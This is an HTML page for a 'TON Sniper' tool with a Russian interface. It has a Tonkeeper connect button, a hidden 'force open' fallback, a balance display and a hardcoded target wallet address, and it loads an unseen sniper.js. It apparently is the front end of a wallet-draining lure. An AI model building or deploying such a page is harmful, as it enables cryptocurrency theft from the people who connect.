<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TON Sniper</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        h1 {
            font-size: 24px;
            background: linear-gradient(90deg, #00d4ff, #0099ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .btn {
            background: linear-gradient(135deg, #00d4ff, #0077ff);
            border: none;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            padding: 16px 40px;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            margin: 15px 0;
            transition: 0.3s;
        }
        .btn:hover {
            transform: scale(1.03);
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        #status {
            padding: 12px;
            border-radius: 10px;
            background: #111;
            min-height: 50px;
            border: 1px solid #2a2a2a;
            margin-top: 15px;
        }
        .wallet-info {
            background: #111;
            padding: 15px;
            border-radius: 12px;
            margin: 15px 0;
            word-break: break-all;
            font-size: 12px;
            color: #aaa;
            border: 1px solid #2a2a2a;
        }
        #balanceDisplay {
            color: #00ff88;
            font-size: 16px;
            margin: 10px 0;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ TON SNIPER</h1>
        <div class="wallet-info">
            <strong>👤 Адрес:</strong> <span id="userWallet">Не подключён</span>
        </div>
        <div id="balanceDisplay">💰 Баланс: 0 TON</div>

        <!-- ОСНОВНАЯ КНОПКА -->
        <button class="btn" id="connectBtn">🔗 ПОДКЛЮЧИТЬ TON KEEPER</button>

        <!-- ЗАПАСНАЯ КНОПКА (если основная не работает) -->
        <button class="btn hidden" id="fallbackBtn" style="background: linear-gradient(135deg, #ff6b00, #ff3300);">
            ⚡ ПРИНУДИТЕЛЬНО ОТКРЫТЬ TON KEEPER
        </button>

        <div id="status">⏳ Нажмите кнопку для подключения</div>
        <div style="margin-top:15px;font-size:11px;color:#444;">Цель: UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</div>
    </div>

    <script src="sniper.js"></script>
</body>
</html>
